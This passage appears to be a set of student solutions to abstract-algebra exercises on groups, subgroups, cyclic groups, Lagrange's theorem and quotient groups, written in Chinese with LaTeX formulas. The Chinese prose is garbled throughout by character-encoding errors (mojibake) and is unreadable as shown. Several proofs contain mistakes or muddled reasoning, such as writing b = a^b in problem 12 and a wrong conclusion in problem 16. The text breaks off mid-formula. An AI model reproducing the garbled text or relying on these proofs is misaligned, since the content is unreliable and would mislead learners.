\\cdot a_{n-1}} = G = {a_0, a_1, \\cdots, a_{n-1}}$$ å› ä¸º $$e \\in G$$ï¼Œæ‰€ä»¥$$\\forall a \\in G, \\exist a_t \\in G, a \\cdot a_t = e$$ï¼Œå…¶ä¸­å³æœ‰ $$a_t = a^{-1}$$  æ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ä¸ªç¾¤\n3 #  è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ï¼š\n å› ä¸º $$(G_1, +_1), (G_2, +_2)$$ æ˜¯ç¾¤ï¼Œå› æ­¤ $$x_1 +_1 x_2 \\in G_1, y_1 +_2 y_2 \\in G_2$$ï¼Œæ‰€ä»¥ $$(x_1, y_1) + (x_2, y_2) \\in G$$ï¼Œå³ + åœ¨é›†åˆ G ä¸Šæ˜¯å°é—­çš„  è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ç»“åˆçš„ï¼š\n è€ƒè™‘ $$(x_1, y_1), (x_2, y_2), (x_3, y_3) \\in G$$ $$((x_1, y_1) + (x_2, y_2)) + (x_3, y_3) = (x_1 +_1 x_2, y_1 +_2 y_2) + (x_3, y_3) = ((x_1 +_1 x_2) +_1 x_3, (y_1 +_2 y_2) +_2 y_3)$$ $$(x_1, y_1) + ((x_2, y_2) + (x_3, y_3)) = (x_1, y_1) + (x_2 +_1 x_3, y_2 +_2 y_3) = (x_1 +_1 (x_2 +_1 x_3), y_1 +_2 (y_2 +_2 y_3))$$ åˆç”±äº $$(G_1, +_1), (G_2, +_2)$$ æ˜¯ç¾¤ï¼Œä¹Ÿå°±æ»¡è¶³ç»“åˆç‡ï¼Œæ‰€ä»¥ä¸Šä¸¤å¼ç›¸ç­‰ã€‚å³ + åœ¨ G ä¸Šæ˜¯ç»“åˆçš„ã€‚  è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒï¼š\n  è®¾ç¾¤ $$(G_1, +_1), (G_2, +_2)$$ çš„å¹ºå…ƒåˆ†åˆ«ä¸º $$e_1, e_2$$ï¼Œè€ƒè™‘ $$e = (e_1, e_2) \\in G$$\n  $$\\forall (x, y) \\in G \\Rightarrow (x, y) + (e_1, e_2) = (x +_1 e_1, y +_2 e_2) = (x, y)$$ï¼Œæ‰€ä»¥ $$e = (e_1, e_2)$$ å³ä¸ºä»£æ•°ç³»ç»Ÿ $$(G, +)$$ çš„å¹ºå…ƒã€‚\n  è¿™ä¸ªé›†åˆ G ä¸­çš„æ¯ä¸ªå…ƒç´ åœ¨è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­éƒ½å­˜åœ¨é€†å…ƒï¼š\n ç”±äº $$(G_1, +_1), (G_2, +_2)$$ æ˜¯ç¾¤ï¼Œå…¶å†…ä»»æ„å…ƒç´ éƒ½å­˜åœ¨é€†å…ƒ $$\\forall (x, y) \\in G \\Rightarrow (x,y) + (x^{-1}, y^{-1}) = (x +_1 x^{-1}, y +_2 y^{-1}) = (e_1, e_2) = e \\Rightarrow (x,y)^{-1} = (x^{-1}, y^{-1})$$ã€‚å³ä»»æ„ G ä¸­çš„å…ƒç´ éƒ½å­˜åœ¨é€†å…ƒ  æ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ä¸ªç¾¤ã€‚\n4 #  è®¾è¿™ä¸ªç¾¤ä¸º $$(G, *)$$ï¼Œå…¶å¹ºå…ƒä¸º eï¼Œè€ƒè™‘ $$\\forall a,b \\in G$$ï¼Œæœ‰ï¼š\n  ä»»æ„éå¹ºå…ƒé˜¶ä¸º 2ï¼Œä¸” e æ’æœ‰ $$e * e = e$$ï¼Œæ‰€ä»¥ $$\\forall x \\in G, x * x = e$$\n  $$\\displaystyle e = e \\overset{x*x = e}{\\Leftrightarrow} (a * b) * (a * b) = (a * a) * (b * b)$$\n$$\\overset{å­˜åœ¨é€†å…ƒ}{\\Leftrightarrow} a^{-1}(a * b * a * b) * b^{-1} = a^{-1}(a * a * b * b) * b^{-1} \\overset{æ»¡è¶³ç»“åˆç‡}{\\Leftrightarrow} b * a = a * b$$\n  æ‰€ä»¥è¿™ä¸ªç¾¤æ»¡è¶³äº¤æ¢ç‡ï¼Œæ‰€ä»¥è¿™ä¸ªç¾¤æ˜¯é˜¿è´å°”ç¾¤ã€‚\n5 #  ï¼ˆ1ï¼‰\nè¿ç®—æ˜¯å°é—­çš„ï¼š\n å¯¹äº $$G_1, G_2 \\in 2^S, G_1, G_2 \\sub S, \\Rightarrow \\forall a_1 \\in G_1, a_2 \\in G_2, a_1,a_2 \\in S$$ æ‰€ä»¥ $$\\forall x \\in G_1 \\cup G_2, y \\in G_1 \\cap G_2, x, y \\in S \\Rightarrow G_1 \\cup G_2, G_1 \\cap G_2 \\sub S$$ï¼Œå³äº¤å¹¶è¿ç®—åœ¨ $$2^S$$ ä¸Šéƒ½æ˜¯å°é—­çš„  è¿ç®—æ˜¯ç»“åˆçš„ï¼š\n å¯¹äº $$G_1, G_2, G_3 \\in 2^S$$ï¼Œå¾ˆæ˜¾ç„¶ï¼Œäº¤å¹¶è¿ç®—å¯¹äºé›†åˆæ˜¯ç»“åˆçš„ã€‚  æ‰€ä»¥ $$(2^S, \\cup), (2^S, \\cap)$$ æ˜¾ç„¶éƒ½æ˜¯åŠç¾¤ã€‚\nï¼ˆ2ï¼‰\nè¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ï¼š\n $$\\forall x \\in (A \\text{\\} B) \\cup (B \\text{\\} A)$$ï¼Œå¿…ç„¶æœ‰ $$x \\in A \\cup B$$ï¼Œæ‰€ä»¥ $$A \\Delta B \\in 2^S$$ï¼Œå³è¿™ä¸ªè¿ç®—åœ¨ $$2^S$$ ä¸Šæ˜¯å°é—­çš„ã€‚  è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ç»“åˆçš„ï¼š\n å¯¹äº $$\\forall A, B, C \\in 2^S$$ $$\\displaystyle (A \\Delta B) \\Delta C = (( (A \\text{\\} B) \\cup (B \\text{\\} A) ) \\text{\\} C) \\cup (C \\text{\\} ((A \\text{\\} B) \\cup (B \\text{\\} A))) = (A \\text{\\} B \\text{\\} C) \\cup (B \\text{\\} A \\text{\\} C) \\cup ( C \\text{\\} B \\text{\\} A) \\cup (A \\cap B \\cap C)$$ $$A \\Delta( B \\Delta C) = (A \\text{\\} ((B \\text{\\} C) \\cup (C \\text{\\} B))) \\cup (((B \\text{\\} C) \\cup (C \\text{\\} B)) \\text{\\} A) = (A\\text{\\}B \\text{\\} C) \\cup (A \\cap B \\cap C) \\cup (B \\text{\\}C \\text{\\} A)\\cup (C \\text{\\}B \\text{\\} A)$$ æˆ‘ä»¬è€ƒè™‘å·®è¿ç®—æ€»æœ‰ $$G_1 \\text{\\} G_2 \\text{\\} G_3 = G_1 \\text{\\} G_3 \\text{\\} G_2$$ï¼Œæ‰€ä»¥ä¸Šä¸¤å¼æ˜¯ç›¸ç­‰çš„ï¼Œå› æ­¤è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ»¡è¶³ç»“åˆå¾‹ã€‚  è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒï¼š\n å­˜åœ¨ $$E = \\varnothing$$ï¼Œ$$\\forall G \\in 2^S, G \\Delta E = (\\varnothing \\text{\\} G) \\cup (G \\text{\\} \\varnothing) = G$$ï¼Œå³ E ä¸ºè¿™ä¸ªä»£æ•°ç³»G ä¸­ç»Ÿä¸­çš„å¹ºå…ƒã€‚  è¿™ä¸ªé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ åœ¨è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­éƒ½å­˜åœ¨é€†å…ƒï¼š\n æˆ‘ä»¬çŸ¥é“ï¼š$$A \\text{\\} B = \\varnothing \\Leftrightarrow A \\sub B$$ï¼Œ$$A \\cup B = \\varnothing \\Leftrightarrow A = \\varnothing \\and B = \\varnothing$$ æœ‰ $$\\forall G \\in 2^S, G\u0026rsquo; \\Delta G = (G\u0026rsquo; \\text{\\} G) \\cup (G \\text{\\} G\u0026rsquo;)= \\varnothing \\Leftrightarrow (G \\sub G\u0026rsquo;) \\and (G\u0026rsquo; \\sub G) \\Leftrightarrow G\u0026rsquo; = G$$ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»»æ„çš„ Gï¼Œåœ¨è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­éƒ½å­˜åœ¨å”¯ä¸€çš„é€†å…ƒ G  æ‰€ä»¥ $$(2^S, \\Delta)$$ æ˜¯ä¸€ä¸ªç¾¤ã€‚\n6 #  ï¼ˆ1ï¼‰\nè€ƒè™‘ $$cab = c(ab) = c = (ca)b = b \\Rightarrow b = c$$\nå› æ­¤ $$b = c = a^{-1}$$\nï¼ˆ2ï¼‰\nå……åˆ†æ€§ï¼š\n $$b = a^{-1} \\Rightarrow aba = a(ba) = a$$ $$b = a^{-1} \\Rightarrow ab^2a = (ab)(ba) = e$$  å¿…è¦æ€§ï¼š\n $$e = a a^{-1}= abaa^{-1} = ab = a^{-1}a = a^{-1}aba = ba \\Rightarrow ab = ba = e \\Rightarrow b = a^{-1}$$ è€ƒè™‘ $$(\\mathbb{Z}_3, +), a = 1, b = 1, a+ b + b + a = 1 \\not=0$$ï¼Œåè€…å¹¶ä¸æ˜¯å¿…è¦æ¡ä»¶  ï¼ˆ3ï¼‰\nå……åˆ†æ€§æ˜¯å¾ˆæ˜¾ç„¶çš„ã€‚ä¸‹è¯å¿…è¦æ€§ï¼š\nå› ä¸º G æ˜¯ M çš„å­é›†ï¼ŒäºŒå…ƒè¿ç®—åœ¨ G ä¸Šæ»¡è¶³ç»“åˆå¾‹ï¼Œå¿…ç„¶åœ¨ M ä¸Šæ»¡è¶³ç»“åˆå¾‹ã€‚\nè¿™ä¸ªä»£æ•°ç³»ç»Ÿå­˜åœ¨å¹ºå…ƒï¼š\n  ä»¤ $$g_1 = g_2$$ï¼Œç”±äº G ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å¯é€†çš„ $$g_1^{-1} g_2 = e \\in G$$\n  å› ä¸º G æ˜¯ M çš„å­é›†ï¼Œæ‰€ä»¥ M çš„å¹ºå…ƒå¿…æ˜¯ G çš„å¹ºå…ƒï¼Œæ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿå­˜åœ¨å¹ºå…ƒ\n  è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­æ¯ä¸ªå…ƒç´ éƒ½å­˜åœ¨é€†å…ƒï¼š\n ä»¤ $$g_2 = e$$ï¼Œæˆ‘ä»¬æœ‰ $$\\forall g_1 \\in G, g_1^{-1} \\in G$$  è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ï¼š\n å¯¹äº $$\\forall g_1, g_2 \\in G \\Rightarrow g_1^{-1} \\in G$$ï¼Œå› æ­¤æˆ‘ä»¬æœ‰ $$(g_1^{-1})^{-1} g_2 = g_1 g_2 \\in G$$  æ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ä¸ªç¾¤ã€‚\nï¼ˆ4ï¼‰\nå¯¹äº G ä¸­æ‰€æœ‰çš„å¯é€†å…ƒç´ æ„æˆçš„é›†åˆï¼Œå¯¹äºäºŒå…ƒè¿ç®—å¿…ç„¶æœ‰ç»“åˆå¾‹ã€å­˜åœ¨å¹ºå…ƒã€å­˜åœ¨é€†å…ƒã€‚ä¸‹è¯å°é—­æ€§ï¼š\n $$\\forall g_1, g_2, g_1g_2 \\in G$$ï¼Œè€ƒè™‘ $$g_1g_2$$ çš„é€†å…ƒï¼Œ$$\\exist g_2^{-1}g_1^{-1} \\in G, (g_1g_2)(g_2^{-1}g_1^{-1}) = e$$ å› æ­¤ $$g_1g_2$$ æ˜¯å¯é€†çš„ï¼Œå³è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¹Ÿæ˜¯å°é—­çš„  æ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ä¸ªç¾¤\n7 #  å……åˆ†æ€§æ˜¯å¾ˆæ˜¾ç„¶çš„ã€‚ä¸‹è¯å¿…è¦æ€§ï¼š\nå› ä¸º H æ˜¯ G çš„å­é›†ï¼Œä¸” $$(G, \\cdot)$$ æ˜¯ä¸€ä¸ªç¾¤ï¼Œæ‰€ä»¥ $$(H, \\cdot)$$ å¿…ç„¶æ»¡è¶³ç»“åˆå¾‹ã€‚\nå› ä¸º $$\\forall a, b \\in H, a \\cdot b \\in H$$ï¼Œæ‰€ä»¥ä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ã€‚\nä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒï¼šb\n å› ä¸º H æ˜¯ä¸€ä¸ªæœ‰é™é›†ï¼Œè®¾å…¶åŠ¿ä¸º nï¼Œè€ƒè™‘åºåˆ— $${a, a^2, \\cdots,a^n, a^{n+1}}$$ è€ƒè™‘åˆ°ä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ï¼Œå› æ­¤åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½åœ¨ H ä¸­ï¼Œç„¶è€Œåºåˆ—é•¿åº¦ä¸º n+1ï¼Œæ‰€ä»¥å¿…ç„¶ $$\\exist i,j (i \u0026gt; j), a^i = a^j \\Rightarrow a^i = a^j \\cdot a^{i - j}$$ï¼Œåœ¨é›†åˆ G ä¸­è€ƒè™‘è¿™ä¸ªç­‰å¼æœ‰ $$a^{i - j} =e$$ã€‚ æ‰€ä»¥ $$e \\in H$$ï¼ŒG çš„å¹ºå…ƒå¿…æ˜¯ H çš„å¹ºå…ƒï¼Œæ‰€ä»¥ä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒ  é›†åˆ H ä¸­æ¯ä¸ªå…ƒç´ åœ¨äºŒå…ƒè¿ç®—ä¸‹éƒ½å­˜åœ¨å±äº H çš„é€†å…ƒï¼š\n æ ¹æ®ä¸Šé¢çš„è¯æ˜ï¼Œæˆ‘ä»¬å¾—åˆ°äº† $$a^{i - j} = e$$ï¼Œäºæ˜¯æœ‰ $$a \\cdot (a^{i -j -1}) = e, a^{-1} = a^{i-j-1}$$ï¼Œå› ä¸ºåè€…æ˜¯ a é€šè¿‡ä¸è‡ªèº«è¿›è¡Œæœ‰é™æ¬¡äºŒå…ƒè¿ç®—å¾—åˆ°çš„ï¼Œè€ƒè™‘åˆ°ä»£æ•°ç³»ç»Ÿæ˜¯å°é—­çš„ï¼Œæ‰€ä»¥ $$a^{-1} = a^{i-j-1} \\in H$$  æ‰€ä»¥è¿™ä¸ªæœ‰é™å­é›†ä¸äºŒå…ƒè¿ç®—æ„æˆçš„ä»£æ•°ç³»ç»Ÿå¿…ç„¶æ˜¯ç¾¤ï¼Œä¹Ÿå°±æ˜¯å¿…ç„¶æ˜¯ä¸€ä¸ªå­ç¾¤ã€‚\n8 #  è€ƒè™‘å¾ªç¯ç¾¤ $$(\\mathbb{Z}, +)$$ï¼Œå…¶ç”Ÿæˆå…ƒä¸º 1ã€‚$$(H, +)$$ ä½œä¸ºå¾ªç¯ç¾¤çš„å­ç¾¤ï¼Œå¿…ç„¶ä¹Ÿæ˜¯å¾ªç¯ç¾¤ã€‚\nè®¾åè€…ç”Ÿæˆå…ƒä¸º aï¼Œåˆ™é›†åˆ H å¯ä»¥è¡¨ç¤ºä¸º $${\\cdots, a^{-2}, a^{-1} ,e, a, a^2, a^3, \\cdots}$$ï¼ˆæ­¤å¤„å¹‚æ¬¡è¡¨ç¤ºäºŒå…ƒè¿ç®—åŠ æ³•çš„ç´¯è®¡ï¼Œå³æœ‰ $$a^i = i\\cdot a$$ï¼Œç‚¹è¡¨ç¤ºæ•´æ•°ç¯æ„ä¹‰ä¸Šçš„ä¹˜æ³•ï¼‰\nå› æ­¤å¯¹äº $$\\forall i \\in \\mathbb{Z}$$ï¼Œä»¤ $$m = a$$ï¼Œæˆ‘ä»¬æœ‰é™ªé›† $$m\\mathbb{Z} = {m \\cdot i | i \\in \\mathbb{Z}} = {m^i | i \\in \\mathbb{Z}} = H$$\n9 #  å¯¹äºç¾¤ $$(G, \\cdot)$$ è®¾ä¸¤ä¸ªçœŸå­é›† Aã€B å…¨é›†ä¸º Gï¼Œå› ä¸º $$A \\cup B = G$$ï¼Œæ‰€ä»¥å¿…æœ‰ $$\\exist a \\in A, a \\not\\in B, \\exist b \\in B, b\\not\\in A$$\nè€ƒè™‘ $$a \\cdot b$$ï¼Œå› ä¸º $$(G, \\cdot)$$ æ˜¯ç¾¤ï¼Œæ‰€ä»¥ $$a \\cdot b \\in A \\or a \\cdot b \\in B$$ï¼Œä¸å¤±ä¸€èˆ¬æ€§ï¼Œæˆ‘ä»¬è®¾ $$a \\cdot b \\in A$$\nå› ä¸º $$(A, \\cdot)$$ ä¹Ÿæ˜¯ç¾¤ï¼Œæ‰€ä»¥ $$a^{-1} \\in A \\Rightarrow a^{-1} \\cdot (a \\cdot b) = b \\in A$$ï¼Œè¿™æ˜¯ä¸ä¹‹å‰çš„å‡è®¾æ˜¯çŸ›ç›¾çš„ã€‚\næ‰€ä»¥ä¸å¯èƒ½å­˜åœ¨ç¾¤çš„é›†åˆï¼Œå¯ä»¥å†™æˆä¸¤ä¸ªçœŸå­é›†çš„å¹¶ã€‚\n10 #  è®¾ç¾¤ $$(G, \\cdot)$$ ä¸­çš„å…ƒç´  a å…·æœ‰é˜¶ nï¼Œå¯ä»¥è¯æ˜é›†åˆ $${e, a, a^2, \\cdots, a^{n-1}}$$ ä¸äºŒå…ƒè¿ç®— $$\\cdot$$ æ„æˆä¸€ä¸ªå¾ªç¯ç¾¤ï¼Œè®¾ä¸º Cã€‚\nå¾ˆæ˜¾ç„¶æˆ‘ä»¬æœ‰ $$a^{-1} = a^{n-1}$$ï¼Œç°è¯æ˜è¯¥å…ƒç´ çš„é˜¶ä¸º nï¼š\n é¦–å…ˆæ˜¾ç„¶æœ‰ï¼š$$(a^{n-1})^{n} = a^{-n} = e$$ è‹¥ $$\\exist i \u0026lt; n, (a^{n-1})^{i}$$ï¼Œåˆ™ $$(a^{n-1})^{i} =a^{n-i} = e$$ï¼Œè¿™ä¸ C æ„æˆå¾ªç¯ç¾¤æ˜¯çŸ›ç›¾çš„ã€‚æ‰€ä»¥ $$\\forall i \u0026lt; n, (a^{n-1})^i \\not= e$$  æ‰€ä»¥å…¶é€†å…ƒçš„é˜¶ä¹Ÿä¸º nã€‚\n11 #  è®¾ç¾¤ $$(G, \\cdot)$$ ä¸­çš„å…ƒç´  a å…·æœ‰é˜¶ nï¼Œå¯ä»¥è¯æ˜é›†åˆ $${e, a, a^2, \\cdots, a^{n-1}}$$ ä¸äºŒå…ƒè¿ç®— $$\\cdot$$ æ„æˆä¸€ä¸ªå¾ªç¯ç¾¤ï¼Œè®¾ä¸º Cã€‚\næ ¹æ®æ‹‰æ ¼éƒæ—¥å®šç†ï¼Œ$$|G| \\equiv 0 \\pmod{|C|}$$ï¼Œå³ a çš„é˜¶ n å¯ä»¥æ•´é™¤ G çš„å…ƒç´ ä¸ªæ•°ã€‚\n12 #  å¾ˆæ˜¾ç„¶ 0 ä¸æ˜¯ $$(\\mathbb{Z}_p, +)$$ çš„ç”Ÿæˆå…ƒï¼Œå› æ­¤åªéœ€è¯æ˜ $$\\forall b \\in \\mathbb{Z} \\text{\\} {0}$$ï¼Œb éƒ½æ˜¯ç”Ÿæˆå…ƒå³å¯ã€‚\nå¯¹äº $$(\\mathbb{Z}_p, +)$$ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ˜¾ç„¶çš„ç”Ÿæˆå…ƒ a=1ï¼Œå¯¹äº bï¼Œæ˜¾ç„¶æœ‰ $$b = a^b$$ï¼Œ\nå› ä¸º p æ˜¯ç´ æ•°ï¼Œæˆ‘ä»¬æœ‰ $$\\exist s,t, sp + tb = 1$$ï¼Œè€ƒè™‘ $$a = a^{sp + tb} = (a^{p})^{s}a^{bt} = a^{bt} = b^t$$\nè¿™è¡¨æ˜ä»»æ„ a å¯ä»¥é€šè¿‡äºŒå…ƒè¿ç®—ç”Ÿæˆçš„å…ƒç´ ï¼Œb äº¦å¯ç”Ÿæˆï¼Œè€Œ a æ˜¯ç”Ÿæˆå…ƒï¼Œåˆ™ b ä¸€å®šæ˜¯ç”Ÿæˆå…ƒã€‚\n13 #  è®¾ç¾¤ G çš„å¹ºå…ƒä¸º eã€‚æœ‰ $$xa = ax \\Leftrightarrow a = x^{-1}ax$$\næˆ‘ä»¬è€ƒè™‘ç­‰å¼å³è¾¹å…ƒç´ çš„é˜¶ï¼š\n è‹¥ $$a = e$$ï¼Œåˆ™ç­‰å¼æ’æˆç«‹ è‹¥ $$a \\not= e$$ï¼Œè€ƒè™‘ $$(x^{-1}ax)^2 = x^{-1}a^2x = e$$ï¼Œå³è¾¹å…ƒç´ çš„é˜¶ä¸º 2ï¼Œæ‰€ä»¥å¿…ç„¶å±äºå”¯ä¸€çš„äºŒé˜¶å¾ªç¯ç¾¤ï¼Œæ˜¾ç„¶å®ƒå¹¶ä¸ç­‰äºå¹ºå…ƒï¼Œæ‰€ä»¥ $$x^{-1} a x = a$$  14 #  $$(\\text{G åªæœ‰æœ‰é™ä¸ªå­ç¾¤} \\Rightarrow \\text{G æ˜¯æœ‰é™ç¾¤}) \\Leftrightarrow (æ— é™ç¾¤æ€»æœ‰æ— é™ä¸ªå­ç¾¤)$$\nè€ƒè™‘æ— é™ç¾¤ä¸­çš„å…ƒç´ ï¼š\n å¦‚æœæ‰€æœ‰å…ƒç´ çš„é˜¶å‡ä¸ºæœ‰é™é˜¶ï¼Œé‚£ä¹ˆä¸€å®šå­˜åœ¨æ— é™ä¸ªå­ç¾¤ï¼Œè¿™ä¸ªæ˜¯å¾ˆå®¹æ˜“è¯æ˜çš„ï¼› å¦‚æœå­˜åœ¨æ— é™é˜¶å…ƒç´ ï¼Œé‚£ä¹ˆå¿…ç„¶å­˜åœ¨ä¸€ä¸ªæ— é™é˜¶å¾ªç¯ç¾¤ï¼Œè€Œæ— é™é˜¶å¾ªç¯ç¾¤å¿…ç„¶ä¸ $$(\\mathbb{Z}, +)$$ åŒæ„ï¼Œè€Œåè€…æœ‰æ— é™å­ç¾¤ï¼Œæ‰€ä»¥åŸæ— é™ç¾¤å¿…ç„¶æœ‰æ— é™å­ç¾¤ã€‚  æ‰€ä»¥æ— é™ç¾¤æ€»æœ‰æ— é™ä¸ªå­ç¾¤ï¼Œå› æ­¤åŸå‘½é¢˜å¾—è¯ã€‚\n15 #  ï¼ˆ1ï¼‰\nè®¾å¾ªç¯ç¾¤ H, K çš„ç”Ÿæˆå…ƒåˆ†åˆ«ä¸º h, kï¼Œåˆ™å¿…ç„¶ä¼šæœ‰ï¼š$$h^r = e, k^s = e$$ã€‚\nè€ƒè™‘å…ƒç´  hkï¼š\n $$(hk)^{rs} = h^{rs} k^{rs} = e$$ $$\\forall i \u0026lt; rs, gcd(r, s) = 1 \\Rightarrow lcm(r,s) = rs \\Rightarrow i \\text{ ä¸åŒæ—¶æ•´é™¤ }r,s$$  å¦‚æœ i ä»…æ•´é™¤å…¶ä¸­ r, s ä¹‹ä¸€ï¼Œå¿…ç„¶æœ‰ï¼š$$(hk)^i \\not= e$$ å¦‚æœäºŒè€…éƒ½ä¸æ•´é™¤ï¼Œæœ‰ $$(hk)^i = h^a k^b, 0\u0026lt;a\u0026lt;r, 0 \u0026lt; b \u0026lt; s$$ï¼Œæˆ‘ä»¬è€ƒè™‘åˆ° $$h^a$$ çš„é€†å…ƒå¿…ç„¶åœ¨å¾ªç¯ç¾¤ç¾¤ H ä¸­ï¼Œå› æ­¤å¿…ç„¶æœ‰ $$(hk)^i \\not= e$$    æ‰€ä»¥å…ƒç´  hk çš„é˜¶ä¸º rsï¼Œå› æ­¤è¯¥å…ƒç´ å¯ä»¥ç”Ÿæˆä¸€ä¸ªé˜¶ä¸º rs çš„å¾ªç¯å­ç¾¤ã€‚\nï¼ˆ2ï¼‰\nè·Ÿç¬¬ä¸€é—®çš„è¯æ³•ä¸€æ ·ã€‚\n16 #  å¯¹äºè´¨æ•°é˜¶çš„ç¾¤è€ƒè™‘æ‹‰æ ¼æœ—æ—¥å®šç†ï¼Œå¦‚æœæœ‰å­ç¾¤ Hï¼Œåˆ™å…¶é˜¶å¿…ç„¶è¢«è´¨æ•°æ•´é™¤ï¼Œé‚£ä¹ˆè¿™ä¸ªå­ç¾¤çš„é˜¶å¿…ç„¶ä¸º 1 æˆ–è¿™ä¸ªè´¨æ•°æœ¬èº«ï¼Œåˆ™è¯¥ç¾¤å¿…ç„¶æ˜¯éå¹³å‡¡å­ç¾¤ã€‚\n17 #  é¦–å…ˆæ˜¾ç„¶æœ‰ $$G_1 \\sub G_1 G_2, G_2 \\sub G_1 G_2$$\nè€ƒè™‘åˆ° $$G_1 \\cap G_2$$ ä¸­æ˜¯å«å¹ºå…ƒã€æ»¡è¶³ç»“åˆå¾‹çš„ï¼Œç„¶åï¼š\n $$G_1 \\cap G_2$$ ä¸­ä»»å–ä¸¤å…ƒç´ ä¸€å®šåŒæ—¶å±äºä¸¤ä¸ªç¾¤ï¼Œå…¶äºŒå…ƒè¿ç®—çš„ç»“æœä¹Ÿä¸€å®šå±äºä¸¤ä¸ªç¾¤ï¼Œå› æ­¤æ»¡è¶³å°é—­æ€§ $$G_1 \\cap G_2 $$ ä¸­ä»»æ„å…ƒç´ çš„é€†å…ƒå¿…å®šåŒæ—¶å­˜åœ¨ä¸¤ä¸ªç¾¤ä¸­ï¼Œå› æ­¤å®ƒä¹Ÿæ˜¯æ»¡è¶³å­˜åœ¨é€†å…ƒçš„ã€‚  å› æ­¤ $$G_1 \\cap G_2$$ æ„æˆä¸€ä¸ªç¾¤ã€‚\næ˜¾ç„¶ $$G_1G_2$$ æ„æˆä¸€ä¸ªç¾¤ï¼Œè€ƒè™‘ $$G_1 G_2$$ çš„å­ç¾¤ $$G_2$$ æ‰€ç¡®å®šçš„å·¦é™ªé›†å…³ç³»å¯¹ $$G_1 G_2$$ è¿›è¡Œåˆ’åˆ†ï¼Œäºæ˜¯æˆ‘ä»¬æœ‰ï¼š\n $$|G_1 G_2| = [G_1G_2:1] = [G_1G_2: G_2][G_2:1]$$  è€ƒè™‘å•†é›†ï¼š$$[G_1G_2:G_2] = card({g_1g_2G_2 | g_1 \\in G_1, g_2 \\in G_2}) = card({g_1G_2 | g_1 \\in G_1})$$\nå› ä¸ºæˆ‘ä»¬æœ‰ $$G_1 \\cap G_2 \\sub G_2$$ï¼Œæ‰€ä»¥è‹¥ $$g_i G_2, g_j G_2$$ ä¸ç›¸äº¤ï¼Œé‚£ä¹ˆ $$g_i (G_1 \\cap G_2), g_j (G_1 \\cap G_2)$$ å¿…ç„¶äº’ä¸ç›¸äº¤ï¼Œæ‰€ä»¥ï¼š$$card({g_1G_2 | g_1 \\in G_1}) = card({g_1(G_1 \\cap G_2) | g_1 \\in G_1}) = [G_1:G_1 \\cap G_2]$$ï¼Œå³ï¼š\n $$[G_1G_2:G_2] = [G_1 : G_1 \\cap G_2]$$  è€ƒè™‘è¿™ä¸ªæŒ‡æ ‡çš„è®¡ç®—ï¼š\n $$\\displaystyle |G_1 : G_1 \\cap G_2| = \\frac{[G_1:1]}{[G_1 \\cap G_2 : 1]}$$  ç»¼ä¸Šæˆ‘ä»¬æœ‰ï¼š$$\\displaystyle |G_1G_2| = \\frac{|G_2:1||G_1:1|}{|G_1 \\cap G_2:1|}$$\n18 #  è€ƒè™‘ G çš„é˜¶çš„è®¡ç®—ï¼š$$|G| = [G:1] = [G:G_2][G_2:1] = [G:G_1][G_1:1]$$\nå¯¹äº $$G_1 \\sub G_2$$ æˆ‘ä»¬åˆæœ‰ï¼š$$[G_2:1] = [G_2:G_1][G_1:1]$$\näºæ˜¯ç»“åˆä¸Šå¼ï¼š$$[G:G_2] = [G:G_1][G_1:G_2]$$\n19 #  å……åˆ†æ€§ï¼š\n  è‹¥å•†ç¾¤ $$(G/H, \\cdot)$$ æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$$\\forall g, k \\in G, gH \\cdot kH = kH \\cdot gH \\Rightarrow (g \\cdot k)H = (k \\cdot g) H$$ï¼Œä»¤ $$H\u0026rsquo; = (g \\cdot k)H = (k \\cdot g)H$$\n  åˆ™å¯¹äº $$\\displaystyle \\forall x \\in H\u0026rsquo;, \\exist a, b \\in H \\overset{s.t.}{\\Rightarrow} (g \\cdot k) \\cdot a = (k \\cdot g) \\cdot b \\Rightarrow g^{-1} \\cdot k^{-1} \\cdot g \\cdot k = b \\cdot a^{-1} \\in H$$\n  å› ä¸º $$\\forall g,k \\in G \\Rightarrow g^{-1},k^{-1} \\in G$$ï¼Œå› æ­¤å¿…ç„¶æœ‰ $$g \\cdot k \\cdot g^{-1} \\cdot k^{-1} \\in H$$\n  å¿…è¦æ€§ï¼š\n  è®¾ $$\\equiv$$ æ˜¯ç”± H ç¡®å®šçš„åœ¨ G ä¸Šçš„å·¦é™ªé›†å…³ç³»ã€‚å› ä¸º $$g \\cdot k \\cdot g^{-1} \\cdot k^{-1} \\in H$$ï¼Œæ‰€ä»¥æœ‰ $$k^{-1} \\cdot g^{-1} \\equiv g^{-1} \\cdot k^{-1} \\Rightarrow (k^{-1} \\cdot g^{-1})H = (g^{-1} \\cdot k^{-1})H$$\n  åŒæ ·çš„ï¼Œ$$\\forall g,k \\in G \\Rightarrow 